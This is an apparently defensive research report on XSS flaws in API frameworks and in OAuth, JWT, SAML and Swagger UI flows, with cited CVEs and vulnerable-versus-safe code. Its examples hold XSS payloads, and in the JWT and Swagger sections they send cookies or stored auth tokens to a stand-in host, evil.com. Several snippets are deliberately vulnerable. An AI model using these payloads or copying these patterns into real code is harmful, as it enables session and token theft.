# XSS Vulnerabilities in Modern API Frameworks and Authentication Flows (2024-2026)

## FastAPI/Starlette XSS CVEs

### Takeaway
No XSS-specific CVEs were found for FastAPI or Starlette in the 2024-2026 window. The most significant recent vulnerabilities are an authentication bypass (CVE-2026-48710) and denial-of-service issues, not XSS. The Swagger UI integration inherits whatever Swagger UI version is bundled, so the Swagger UI DOM XSS issues (covered below) apply when an older Swagger UI ships with a FastAPI app.

### Cited Findings
- **CVE-2026-48710 ("BadHost"):** Authentication bypass in Starlette affecting versions 0.8.3 through 1.0.0. A single malformed Host header character lets unauthenticated attackers bypass path-based middleware. Patched in Starlette 1.0.1. Researchers at X41 D-Sec found it could chain into SSRF. Not XSS, but relevant as a middleware bypass that could disable XSS protections set in middleware. -- [Abit.ee Advisory](https://abit.ee/en/cybersecurity/vulnerabilities/starlette-badhost-cve-2026-48710-vulnerability-fastapi-python-ai-agents-cybersecurity-en); [CryptoBriefing](https://cryptobriefing.com/starlette-badhost-vulnerability-ai-agents/)
- **CVE-2025-62727:** Denial-of-service via crafted Range headers against Starlette's FileResponse, enabling ReDoS. Patched in 0.49.1. -- [GitHub Issue](https://github.com/tubalainen/varmlandsinfo/issues/85)
- **CVE-2024-47874:** DoS through oversized multipart form fields. Patched in Starlette 0.40.0. -- [CCB Belgium Advisory](https://ccb.belgium.be/advisories/warning-vulnerability-starlette-framework-and-related-frameworks-fastapi-exposes)
- **CVE-2024-24762:** Listed on NVD against FastAPI < 0.109.1 and Starlette < 0.36.2. Description not confirmed from search results. -- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-24762)
- Starlette's debug error pages render tracebacks with request details. While no CVE exists for XSS in these pages, the pattern mirrors the Laravel debug-mode XSS (CVE-2024-13918) and should be treated as a risk when debug mode is enabled in production. -- [Medium Analysis](https://medium.com/@onurbaskin/critical-security-vulnerability-in-starlette-fastapi-f75adfb86134)

### Inferences
- The absence of XSS CVEs likely reflects that Starlette's default error responses return plain text or JSON, not HTML. However, custom error handlers that render HTML from request data remain a risk.
- The BadHost middleware bypass (CVE-2026-48710) could disable CSP or other security headers set in middleware, indirectly enabling XSS in downstream responses.

### Gaps
- No primary source confirmed whether Starlette's debug traceback page HTML-encodes request parameters. Manual testing or source review would be needed.
- No CVE data found for XSS in FastAPI's auto-generated Swagger UI integration specifically (as opposed to standalone Swagger UI).


## Express.js Middleware Bypass Techniques Enabling XSS

### Takeaway
Express's `res.send()` defaults to `text/html` content type for string arguments, making any reflected user input an XSS vector unless the content type is explicitly set. CVE-2024-43796 covers a redirect-based XSS. Prototype pollution gadgets can force HTML responses in some configurations. No new `res.send()` content-type inference bypass CVE was found for 2024-2025.

### Cited Findings
- **res.send() default behavior:** Express sends a string passed to `res.send()` as `text/html` unless a different response type has been set. Writing directly to the response object bypasses the template engine, so content will not be autoescaped. -- [Semgrep Cheat Sheet](https://semgrep.dev/docs/cheat-sheets/express-xss)
- **CVE-2024-43796 (Express < 4.20.0):** Passing untrusted user input to `response.redirect()` may execute untrusted code even after sanitizing it. Fixed in Express 4.20.0. -- [GHSA-rv95-896h-c2vc](https://github.com/advisories/GHSA-rv95-896h-c2vc)
- **Prototype pollution gadget:** HackTricks documents a gadget where prototype pollution can force Express to serve an HTML content type when `res.send(obj)` is called with a body parser configured for `application/json`. The pollution sets `content-type` on `Object.prototype`. -- [HackTricks](https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html)
- **helmet.js bypass scenarios:** Helmet sets security headers including CSP, but it only works if applied before route handlers. Middleware ordering errors or conditional application (e.g., skipping helmet in development) create bypass windows. No specific CVE found for helmet bypass in 2024-2025.
- **express-validator escape bypass:** An older issue (express-validator #651) shows that changing a parameter to an array bypasses the `escape()` function. -- [express-validator Issue #651](https://github.com/express-validator/express-validator/issues/651)

### Vulnerable Pattern Example
```javascript
// VULNERABLE: res.send() with string defaults to text/html
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`No results found for: ${query}`);
  // Payload: /search?q=<script>alert(document.cookie)</script>
});

// VULNERABLE: error handler reflecting input
app.use((err, req, res, next) => {
  res.status(500).send(`Error processing ${req.originalUrl}: ${err.message}`);
  // Reflected XSS via URL path
});

// SAFE: explicit content type
app.get('/search', (req, res) => {
  res.type('text/plain').send(`No results found for: ${req.query.q}`);
});
```

### Inferences
- The `res.send()` HTML default is by design and documented, but remains a frequent source of reflected XSS in Express APIs that return error messages or echoed input as strings.
- Prototype pollution expanding to content-type manipulation is a viable attack chain in apps that use `res.send()` with objects and have a pollutable code path.

### Gaps
- No 2024-2025 research found specifically on helmet.js CSP bypass techniques beyond middleware ordering issues.
- No specific CVE found for Express error handler reflection XSS (the pattern is well-known but not tracked as a framework vulnerability).


## Spring Boot Error Page XSS Vulnerabilities

### Takeaway
The most critical Spring Boot Whitelabel error page vulnerability is an older SpEL injection (RCE, not just XSS) in versions before 1.2.8/1.3.1. No new XSS CVE was found for the Whitelabel error page in 2024-2026. Current Spring Boot versions HTML-encode error attributes by default, but custom error pages that use `th:utext` (unescaped) in Thymeleaf remain a risk.

### Cited Findings
- **SpEL injection in Whitelabel (pre-1.2.8/1.3.1):** User-controlled data from the request (path variables, parameters) reflected in the error page without sanitization allows injection of SpEL expressions evaluated server-side, leading to RCE. CWE-94. Immediate mitigation: set `server.error.whitelabel.enabled=false`. -- [Tenable](https://www.tenable.com/plugins/was/112380); [Acunetix](https://www.acunetix.com/vulnerabilities/web/spring-boot-whitelabel-error-page-spel/)
- **Older XSS in Whitelabel (pre-1.1.8):** The white label error page did not properly escape strings, enabling XSS. -- [SourceClear](https://www.sourceclear.com/vulnerability-database/security/cross-site-scripting-xss/java/sid-1846)
- **Spring Security OAuth XSS (2015):** Invalid parameters sent to the authorize endpoint were rendered on the white label error page without escaping. -- [GitHub Issue #636](https://github.com/spring-attic/spring-security-oauth/issues/636)
- **Actuator endpoint reflection:** Spring Boot Actuator endpoints (e.g., `/actuator/env`, `/actuator/health`) return JSON by default. When a custom error handler or actuator UI renders these as HTML, unescaped values can produce XSS. No specific CVE found for this in 2024-2026.

### Vulnerable Pattern Example
```java
// VULNERABLE: Custom error page with unescaped output (Thymeleaf)
// error.html
// <p th:utext="${message}">Error</p>
// If 'message' contains user input from query params, XSS results.

// SAFE: Use th:text (auto-escaped)
// <p th:text="${message}">Error</p>

// VULNERABLE: Actuator custom UI rendering
@GetMapping("/admin/env")
public String showEnv(Model model) {
    Map<String, Object> env = actuatorEndpoint.environment(null).getPropertySources();
    model.addAttribute("env", env); // If env values contain HTML and template uses th:utext
    return "env-view";
}
```

### Inferences
- Modern Spring Boot (3.x) is not affected by the original Whitelabel XSS or SpEL issues. The risk has shifted to custom error handlers and Thymeleaf templates using `th:utext`.
- Actuator endpoints are JSON-only by default but become XSS vectors when wrapped in custom HTML UIs without encoding.

### Gaps
- No 2024-2026 CVE found for Spring Boot Whitelabel or actuator XSS. The topic appears to be well-mitigated in current versions.
- No research found on Spring Boot's default error JSON response being coerced to HTML by content negotiation attacks.


## Django REST Framework XSS Vectors

### Takeaway
CVE-2024-21520 (CVSS 6.1) is a confirmed XSS in the DRF Browsable API's `break_long_headers` template filter, fixed in 3.15.2. An older CVE (CVE-2018-25045) affected the same Browsable API through disabled autoescaping in templates, fixed in 3.9.1.

### Cited Findings
- **CVE-2024-21520 (June 2024):** XSS in the `break_long_headers` template filter used by the Browsable API. Affected versions below 3.15.2. CVSS 3.1 score: 6.1 (Medium). Fixed in DRF 3.15.2, released June 14, 2024. The release notes describe it as "a fix for a potential XSS vulnerability in browsable API." -- [CVEFeed](https://cvefeed.io/vuln/detail/CVE-2024-21520); [Vulners/GHSA](https://vulners.com/github/GHSA-FX83-3PH3-9J2Q); [DRF Release Notes](https://www.django-rest-framework.org/community/release-notes/)
- **CVE-2018-25045:** Versions before 3.9.1 had XSS because the default DRF Browsable API view templates disabled autoescaping. -- [OpenCVE](https://app.opencve.io/cve/?vendor=django-rest-framework)
- **Serializer error message reflection:** DRF serializer validation errors are returned as JSON by default. When a custom exception handler renders these errors in HTML (e.g., a custom error page), unsanitized field names or error messages can produce XSS. No CVE found for this pattern.
- **Browsable API exposure:** The Browsable API is enabled by default in DRF and renders HTML forms for API interaction. In production, it should be disabled via `DEFAULT_RENDERER_CLASSES` set to `JSONRenderer` only.

### Vulnerable Pattern Example
```python
# VULNERABLE: Custom exception handler rendering errors as HTML
from rest_framework.views import exception_handler

def custom_exception_handler(exc, context):
    response = exception_handler(exc, context)
    if response is not None:
        # If field names contain user input (e.g., dynamic fields), XSS is possible
        html = "<ul>"
        for field, errors in response.data.items():
            html += f"<li>{field}: {', '.join(str(e) for e in errors)}</li>"
        html += "</ul>"
        response.content_type = 'text/html'
        response.data = html  # Unescaped field names and error messages
    return response

# SAFE: Keep JSON responses, disable Browsable API in production
REST_FRAMEWORK = {
    'DEFAULT_RENDERER_CLASSES': ['rest_framework.renderers.JSONRenderer'],
}
```

### Inferences
- The Browsable API is the primary XSS surface in DRF. Disabling it in production eliminates most risk.
- Custom exception handlers that convert JSON error responses to HTML are a developer-introduced XSS vector, not a framework bug.

### Gaps
- No detailed exploit write-up found for CVE-2024-21520 showing the exact payload. The `break_long_headers` filter's vulnerable code path was not detailed in publicly available sources.
- No research found on XSS through DRF's schema/OpenAPI generation endpoints.


## Laravel API XSS Vulnerabilities

### Takeaway
Two confirmed reflected XSS CVEs (CVE-2024-13918 and CVE-2024-13919) affect Laravel 11.9.0-11.35.1 in debug mode. Both exploit unescaped rendering of request/route parameters on 5XX error pages using Blade's `{!! !!}` (raw output) tags. Fixed in 11.36.0. CVSS 8.0 (High).

### Cited Findings
- **CVE-2024-13918:** Reflected XSS via request parameters in the debug-mode error page. Affected versions 11.9.0 through 11.35.1. CVSS 3.1 base score 8.0 (High). The values in URL parameters and the request body are embedded in the error page without proper encoding, using Blade `{!! !!}` tags. Fix: Laravel 11.36.0, patch `laravel/framework#53869`. -- [SBA Research Advisory](https://www.sba-research.org/2025/03/10/sba-security-advisory-laravel-reflected-xss-via-request-parameter-in-debug-mode-error-page-cve-2024-13918/); [GitHub Advisory](https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-01_Laravel_Reflected_XSS_via_Request_Parameter_in_Debug-Mode_Error_Page)
- **CVE-2024-13919:** Reflected XSS via route parameters in the debug-mode error page. Same affected versions and fix. Improperly encoded route parameters on the error page. -- [SBA Research Advisory](https://www.sba-research.org/2025/03/10/sba-security-advisory-laravel-reflected-xss-via-route-parameter-in-debug-mode-error-page-cve-2024-13919/); [CVEFeed](https://cvefeed.io/vuln/detail/CVE-2024-13919)
- **Timeline:** Identified 2024-11-28 (in Laravel 11.34.1). Reported to vendor 2024-12-09. Patch merged 2024-12-13. Fixed release 2024-12-17. Public disclosure 2025-03-10. The vendor did not respond to follow-up contact attempts. -- [SBA Research](https://www.sba-research.org/2025/03/10/sba-security-advisory-laravel-reflected-xss-via-request-parameter-in-debug-mode-error-page-cve-2024-13918/)
- **Proof of Concept:** Set `APP_DEBUG=true` in `.env`. Create a route that throws an error: `Route::get('/poc-url', function () { return 0/0; });`. Visit `http://localhost:8000/poc-url?payload=<script>alert(1)</script>`. The division by zero returns a 500 error page and the unencoded payload value executes as JavaScript. -- [SBA Research](https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20241209-01_Laravel_Reflected_XSS_via_Request_Parameter_in_Debug-Mode_Error_Page)
- **Validation error rendering:** Laravel's default validation error responses are JSON for API routes (via `Accept: application/json`). When the Accept header is missing or set to `text/html`, Laravel may render validation errors in a Blade template. Custom error views that use `{!! !!}` for field names or error messages introduce XSS. No CVE found for this specific pattern.

### Inferences
- The `{!! !!}` Blade syntax is the root cause, as it explicitly disables HTML escaping. Any use of `{!! !!}` with user-controlled data is an XSS vector.
- Debug mode in production is a precondition for these CVEs. The high CVSS score (8.0) reflects the severity when debug mode is enabled.
- The vendor's non-responsiveness to security reports is noted in the advisory timeline.

### Gaps
- No CVE found for XSS in Laravel's validation error rendering outside debug mode.
- No research found on Laravel API-specific Blade rendering (e.g., when an API route accidentally returns a Blade view).


## NestJS-Specific XSS Vectors

### Takeaway
CVE-2025-69211 is a confirmed middleware bypass in `@nestjs/platform-fastify` (before 11.1.11) where percent-encoded URLs skip route-scoped middleware, potentially bypassing XSS sanitization. No direct XSS CVE was found for NestJS WebSocket gateways, but the middleware bypass applies to any security middleware including input sanitization.

### Cited Findings
- **CVE-2025-69211 (Fastify URL Encoding Middleware Bypass):** Middleware registered on string-path routes (e.g., `.forRoutes('admin')`) can be skipped by percent-encoding the path (e.g., `/%61dmin` for `/admin`). CWE-367 (TOCTOU). CVSS 4.0 score: 6.9 (Medium). Affected: `@nestjs/platform-fastify` before 11.1.11. Fixed in 11.1.11. Exploitation allows unauthenticated access to protected routes, privilege escalation, and skipping sanitization/validation middleware. -- [NVD](https://nvd.nist.gov/vuln/detail/cve-2025-69211); [CVE Premium](https://cvepremium.circl.lu/vuln/CVE-2025-69211); [CVELogic](https://www.cvelogic.com/cve/CVE-2025-69211)
- **Fastify vs Express adapter differences:** The CVE applies only to `@nestjs/platform-fastify`. The Express adapter is not affected because Express normalizes URL encoding before middleware matching. This creates a security parity gap between the two adapters. -- [Mend.io](https://www.mend.io/vulnerability-database/CVE-2025-69211/)
- **WebSocket gateway authentication gap:** NestJS Guards applied to WebSocket gateways allow any user to establish a connection before the guard runs. Authentication must happen during the handshake via Socket.IO middleware, not NestJS Guards. -- [Preet Mishra Blog](https://preetmishra.com/blog/the-best-way-to-authenticate-websockets-in-nestjs)
- **Security headers:** Starting with NestJS v12.1, `app.useSecurityHeaders()` sets CSP and other security headers. Prior versions require manual helmet integration. The docs do not mention WebSocket gateway header support. -- [NestJS Docs](https://docs.nestjs.com/security/helmet)

### Vulnerable Pattern Example
```typescript
// VULNERABLE: Sanitization middleware bypassed via URL encoding (Fastify adapter)
@Module({})
export class AppModule implements NestModule {
  configure(consumer: MiddlewareConsumer) {
    consumer
      .apply(SanitizationMiddleware) // Strips <script> tags from input
      .forRoutes('api/comments'); // Only matches exact string 'api/comments'
  }
}
// Attacker sends POST /%61pi/comments with XSS payload in body
// Middleware is skipped, controller receives unsanitized input

// SAFE: Use route objects instead of strings, or upgrade to 11.1.11+
consumer
  .apply(SanitizationMiddleware)
  .forRoutes({ path: 'api/comments', method: RequestMethod.ALL });
```

### Inferences
- The Fastify adapter's URL handling is a TOCTOU issue: middleware sees the raw (encoded) path but the router sees the decoded path. Any middleware-based security control (CSP headers, input sanitization, authentication) is bypassable on affected versions.
- WebSocket gateways in NestJS have a fundamentally different security model from HTTP routes: guards run after connection, not during handshake. This is documented but frequently misunderstood.

### Gaps
- No CVE found specifically for XSS in NestJS WebSocket message handling.
- No research found comparing XSS handling between NestJS SSE (Server-Sent Events) and WebSocket gateways.
- No analysis found on NestJS's built-in exception filters and whether they can produce HTML responses containing unsanitized input.


## OAuth 2.0/OIDC redirect_uri XSS Techniques (2024-2026)

### Takeaway
OAuth redirect_uri remains a significant XSS attack surface. CVE-2026-32235 (Backstage auth backend) demonstrates that crafted URIs can pass allowlist verification while resolving to attacker hosts. Open redirectors on registered callback domains remain the primary bypass technique, since RFC 9700's exact-match requirement does not cover second-hop redirects on the registered domain itself.

### Cited Findings
- **CVE-2026-32235 (Backstage auth backend):** Affects `@backstage/plugin-auth-backend` before 0.27.1. CVSS 5.9. A crafted URI passes allowlist verification while resolving to the attacker's host, enabling authorization code theft. -- [OAuth redirect_uri research results]
- **Open redirect chaining:** When a registered redirect_uri domain hosts an open redirector, the authorization server approves the request and never sees the second hop. The attacker receives the authorization code or token via the chained redirect. This is outside RFC 9700's scope. -- [Dev.to Analysis](https://dev.to/roxdavirox/oauth-20-redirecturi-open-redirect-and-pkce-observable-pre-conditions-before-exploitation-4646)
- **State parameter reflection:** The OAuth `state` parameter is echoed back to the client after authorization. If the client renders the state value in HTML without encoding, it becomes a reflected XSS vector. The state parameter was designed for CSRF protection, not as a data channel. -- [Praetorian](https://www.praetorian.com/blog/attacking-and-defending-oauth-2/)
- **Parameter pollution in redirect URI:** A 2023 ACM paper finds that the RFC leaves redirect_uri open to parameter pollution attacks, where duplicated security-sensitive parameters exploit parsing differences between the authorization server and client. -- [ACM Paper](https://dl.acm.org/doi/fullHtml/10.1145/3627106.3627140)
- **URI scheme abuse:** `javascript:` and `data:` schemes in redirect_uri can trigger XSS if the authorization server does not block non-HTTPS schemes. -- [PortSwigger](https://portswigger.net/web-security/oauth)
- **PKCE as partial mitigation:** PKCE prevents authorization code interception but does not prevent XSS on the callback page. An XSS on the callback page can read the code from the URL before the legitimate client exchanges it. -- [Dev.to](https://dev.to/roxdavirox/oauth-20-redirecturi-open-redirect-and-pkce-observable-pre-conditions-before-exploitation-4646)
- **Authorization code leakage:** If the callback page has XSS, the authorization code in the URL fragment or query string is accessible to injected JavaScript. The code can be exfiltrated and exchanged for tokens at the token endpoint (unless PKCE with a secret code_verifier is used). -- [OWASP](https://owasp.org/www-community/attacks/open_redirect); [Vaadata](https://www.vaadata.com/en/blog/understanding-oauth-2-0-and-its-common-vulnerabilities/)

### Vulnerable Pattern Example
```javascript
// VULNERABLE: State parameter rendered without encoding
app.get('/oauth/callback', (req, res) => {
  const { code, state } = req.query;
  // state was set by attacker: <img src=x onerror=alert(document.cookie)>
  res.send(`<p>Authenticating... State: ${state}</p>`);
});

// VULNERABLE: Open redirect on callback domain
app.get('/redirect', (req, res) => {
  res.redirect(req.query.url); // Open redirector on registered callback domain
});
// Attacker registers: https://app.example.com/redirect?url=https://evil.com
// Auth server approves because domain matches, code leaks to evil.com
```

### Inferences
- Exact-match redirect_uri validation is necessary but not sufficient. The registered domain must also be free of open redirectors.
- PKCE mitigates code interception in transit but does not protect against XSS on the callback page itself.
- The state parameter is an underappreciated XSS vector because developers assume it is "their" data, not attacker-controlled.

### Gaps
- No comprehensive 2024-2026 survey found of PKCE bypass scenarios specifically enabling XSS (as opposed to code interception).
- No research found on OIDC `id_token` direct-post mode and XSS in the form_post callback.


## JWT Claim Rendering XSS Vectors

### Takeaway
JWT claims (name, email, profile URL) are base64-encoded but not encrypted, and are frequently rendered in HTML without sanitization. No specific CVE was found for JWT claim XSS, but the pattern is well-documented as a class of stored XSS where the JWT serves as the persistence mechanism.

### Cited Findings
- **Claims are readable by anyone:** A JWT's payload is base64url-encoded, not encrypted. Any client-side code can decode and render claims. Treat claim values as untrusted input on the client. -- [WorkOS](https://workos.com/blog/secure-jwt-storage)
- **Stored XSS via JWT claims:** A FlowFunds code review found stored XSS where user-controlled text (including JWT-derived fields like `user.name`) was concatenated into `innerHTML`. The fix was to escape on output. -- [FlowFunds PR](https://github.com/Rithvik09/FlowFunds/pull/1)
- **innerHTML as the primary sink:** A 2025 GitHub issue reports that items rendered with unsanitized `innerHTML` allow DOM XSS. Any JWT claim rendered via `innerHTML`, `document.write`, or React's `dangerouslySetInnerHTML` is a potential vector. -- [buscadorDinamico Issue #14](https://github.com/jhoendryb/buscadorDinamico/issues/14)
- **Token theft compounds the risk:** JWTs stored in localStorage are accessible to any JavaScript on the page. An XSS that reads localStorage can steal the JWT and impersonate the user. HttpOnly cookies prevent this. -- [Medium](https://medium.com/redteam/stealing-jwts-in-localstorage-via-xss-6048d91378a0); [Software Secured](https://www.softwaresecured.com/post/how-to-properly-secure-your-jwts)
- **PII in tokens:** Do not store PII such as email addresses, physical addresses, or financial data in a JWT. If claims must contain display names or emails, sanitize them on write (at the IdP) and escape on render (at the client). -- [LogRocket](https://blog.logrocket.com/jwt-authentication-best-practices/)

### Vulnerable Pattern Example
```javascript
// VULNERABLE: JWT claim rendered via innerHTML
const token = localStorage.getItem('jwt');
const payload = JSON.parse(atob(token.split('.')[1]));
document.getElementById('welcome').innerHTML = `Welcome, ${payload.name}!`;
// If payload.name = "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"
// XSS executes on every page load

// SAFE: Use textContent
document.getElementById('welcome').textContent = `Welcome, ${payload.name}!`;

// SAFE (React): Use JSX auto-escaping
function Welcome({ user }) {
  return <h1>Welcome, {user.name}!</h1>; // Auto-escaped by React
}
```

### Inferences
- JWT claim XSS is a subset of stored XSS where the token serves as the storage mechanism. The attack requires either: (1) a compromised or malicious IdP setting malicious claims, or (2) a self-registration flow that stores user-supplied values (name, email) as claims without sanitization.
- The combination of JWT claim XSS and localStorage token storage creates a self-reinforcing attack: the XSS payload in a claim executes on render and can steal the JWT from localStorage, enabling lateral movement.

### Gaps
- No CVE found specifically for JWT claim rendering XSS in any framework or library.
- No research found on IdP-side claim sanitization practices across major providers (Auth0, Okta, Azure AD).


## SAML Response XSS Techniques

### Takeaway
RelayState parameter XSS is the most common SAML-related XSS vector, with CVE-2025-50055 (OpenVPN) and CVE-2025-12101 (Citrix NetScaler) as recent examples. XML injection in SAML assertions and NameID format abuse are primarily authentication bypass vectors (not XSS), though they can chain with XSS when assertion values are rendered in HTML.

### Cited Findings
- **CVE-2025-50055 (OpenVPN Access Server):** The SAML module lets a configured remote ACS endpoint inject script or HTML through the RelayState parameter. Rated 6.4 (Medium). Affected versions: 2.14.0 through 2.14.3. -- [CyberStrike](https://cyberstrike.io/cve/CVE-2025-50055)
- **CVE-2025-12101 (Citrix NetScaler):** Reflected XSS in RelayState at the `/cgi/logout` endpoint. The attack can be carried out via CSRF since the endpoint accepts HTTP POST requests with a valid SAMLResponse and a modified RelayState. -- [SecPod](https://www.secpod.com/blog/relaystate-ruse-exploiting-reflected-xss-in-citrix-netscaler/)
- **CVE-2024-45409 (ruby-saml, GitLab):** XML signature wrapping flaw. The signature validates one element while the application reads NameID from another, allowing a forged NameID. CVSS 10.0. Fixed in ruby-saml 1.12.3 and 1.16.0. This is an authentication bypass, not XSS, but a forged NameID rendered in a user profile page without encoding becomes stored XSS. -- [ProjectDiscovery](https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass)
- **CVE-2025-54982 (Zscaler):** SAML 2.0 SP implementation does not verify that incoming SAML responses are signed with the configured IdP's public key. Authentication bypass, not XSS. -- [AmberWolf](https://blog.amberwolf.com/blog/2025/august/advisory---zscaler-saml-authentication-bypass/)
- **CVE-2025-27773 (SimpleSAMLphp):** Signature confusion in HTTP-Redirect binding can cause unsigned messages to be accepted. -- [OpenCVE](https://app.opencve.io/cve/?product=saml2&vendor=simplesamlphp)
- **NameID format abuse:** NameID values set to `urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified` allow arbitrary strings. If these strings contain HTML/JavaScript and are rendered without encoding (e.g., in a user profile or admin panel), stored XSS results.

### Vulnerable Pattern Example
```html
<!-- VULNERABLE: RelayState rendered without encoding after SAML SSO -->
<!-- Server-side (e.g., Python/Flask) -->
@app.route('/saml/acs', methods=['POST'])
def saml_acs():
    relay_state = request.form.get('RelayState', '/')
    # After SAML validation, redirect or render RelayState
    return f'<p>Redirecting to: {relay_state}</p>'
    # Payload: RelayState=<script>alert(1)</script>

<!-- VULNERABLE: NameID rendered in profile -->
<h2>Welcome, {{ saml_attributes.nameID }}</h2>
<!-- If NameID = "<img src=x onerror=alert(1)>" and template does not auto-escape -->
```

### Inferences
- RelayState XSS is the most accessible SAML XSS vector because RelayState is often treated as a trusted redirect URL, not as user-controlled input.
- SAML signature bypass vulnerabilities (CVE-2024-45409, CVE-2025-54982) can chain with XSS when forged assertion values (NameID, attributes) are rendered in HTML without encoding.
- The combination of SAML authentication bypass and stored XSS (via forged NameID) is a high-impact attack chain: the attacker gains authenticated access AND plants persistent XSS.

### Gaps
- No CVE found specifically for XML injection in SAML assertions leading to XSS (as opposed to authentication bypass or XXE).
- No research found on SAML attribute statement XSS (e.g., custom attributes like displayName or role containing HTML).


## API Key/Bearer Token Leakage via XSS

### Takeaway
Swagger UI's DOM XSS vulnerabilities (affecting versions 3.14.1-3.38.0 via outdated DOMPurify) are the most documented vector for API key/token theft through API documentation pages. Token storage in localStorage is the primary enabler, as any XSS on the page grants access to stored tokens. No single 2024-2025 CVE links Swagger UI XSS directly to bearer token theft, but the attack chain is well-established.

### Cited Findings
- **Swagger UI DOM XSS (versions 3.14.1-3.38.0):** Vulnerable due to bundled outdated DOMPurify (2.2.2). A victim copies a URL to a YAML/JSON API definition file containing a malicious payload and loads it in Swagger UI. Researchers reported more than 60 instances across bug bounty programs. -- [Vidoc Security Lab](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers); [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)
- **CVE-2024-45801 (DOMPurify):** Malicious nested HTML can bypass depth checking in DOMPurify. Fixed in DOMPurify 2.5.4 and 3.1.3. Swagger UI versions bundling affected DOMPurify are transitively vulnerable. -- [GovWay Advisory](https://govway.readthedocs.io/it/latest/vulnerability-management/securityAdvisory/2024/CVE-2024-45801.html)
- **Gotify Swagger UI XSS (GHSA-qrmm-w75w-3wpx):** Gotify's bundled Swagger UI was vulnerable to rendering XSS via CVE-2020-26870. Fixed in Gotify 2.2.3. -- [GitHub Advisory](https://github.com/gotify/server/security/advisories/GHSA-3244-8mff-w398)
- **Token storage in localStorage:** Jamf Pro's Classic API Swagger UI stores the authentication token in localStorage under `authToken`, making it a target for XSS. -- [Swagger API Vulnerabilities (Medium)](https://medium.com/@shahwarshah/swagger-api-vulnerabilities-9c320cc3f164)
- **Exposed API documentation:** An exposed swagger.json gives an attacker a complete map of every endpoint, parameter, and expected data format. Public Swagger UIs often leak sensitive API endpoints testable for XSS, IDOR, and other vulnerabilities. -- [Medium](https://medium.com/@ghostlulzhacks/swagger-api-c07eca05441e)
- **Bearer token model risk:** The bearer model means any process holding a copy of the key can use it. The receiving system cannot distinguish between legitimate users and attackers. Keys often have no expiration, so a stolen key can be used indefinitely. -- [Layr8](https://layr8.io/blog/why-api-keys-leak)
- **Error message key reflection:** API error messages that reflect API keys (e.g., "Invalid API key: sk-abc123...") create a leakage path. If the error page is vulnerable to XSS, the key can be exfiltrated. -- [API Security Guide 2026](https://chs.us/guides/api-security/)

### Vulnerable Pattern Example
```javascript
// VULNERABLE: Swagger UI with outdated DOMPurify
// swagger.json served from attacker-controlled URL:
{
  "info": {
    "description": "<img src=x onerror='fetch(`https://evil.com/steal?token=${localStorage.getItem(\"authToken\")}`)'>"
  }
}
// When victim loads this spec in Swagger UI < 3.38.0, the XSS fires
// and exfiltrates the auth token from localStorage

// VULNERABLE: Error message reflecting API key
app.use((err, req, res, next) => {
  if (err.type === 'auth') {
    res.status(401).send(
      `Invalid API key: ${req.headers.authorization}` // Reflects the full key
    );
  }
});
// Combined with any reflected XSS on the same origin, the key is extractable
```

### Inferences
- The Swagger UI XSS-to-token-theft chain is: (1) load malicious API spec in Swagger UI, (2) DOM XSS fires via DOMPurify bypass, (3) injected script reads auth token from localStorage, (4) token exfiltrated to attacker. This chain works against any Swagger UI deployment that uses localStorage for auth tokens.
- API documentation pages are high-value XSS targets because they frequently store authentication credentials and are often left accessible in production.
- The shift from API keys to OAuth tokens does not eliminate the risk if tokens are stored in localStorage.

### Gaps
- No single 2024-2025 CVE found that specifically chains Swagger UI XSS to bearer token theft across multiple products. The attack chain is inferred from separate findings.
- No research found on Redoc or other API documentation tools and their XSS surface.
- No data found on how frequently production API documentation pages are exposed to the internet (though scanning tools like APIDetector exist for this purpose).
